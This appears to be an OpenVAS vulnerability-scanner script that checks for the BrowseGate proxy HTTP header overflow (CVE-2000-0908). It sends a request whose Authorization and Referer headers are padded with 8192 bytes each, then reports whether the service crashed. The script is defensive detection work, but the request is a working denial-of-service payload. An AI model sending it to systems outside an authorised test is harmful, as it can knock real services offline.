if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11130" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1702 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2000-0908" );
	script_name( "BrowseGate HTTP headers overflows" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It was possible to kill the BrowseGate
  proxy by sending it an invalid request with too long HTTP headers (Authorization and Referer)" );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
ua = http_get_user_agent();
r = NASLString( "GET / HTTP/1.0\\r\\n", "Authorization: Basic", crap( 8192 ), "\\r\\n", "From: vt-test@example.com\\r\\n", "If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\\r\\n", "Referer: http://www.example.com/", crap( 8192 ), "\\r\\n", "UserAgent: ", ua, "\\r\\n\\r\\n" );
send( socket: soc, data: r );
http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

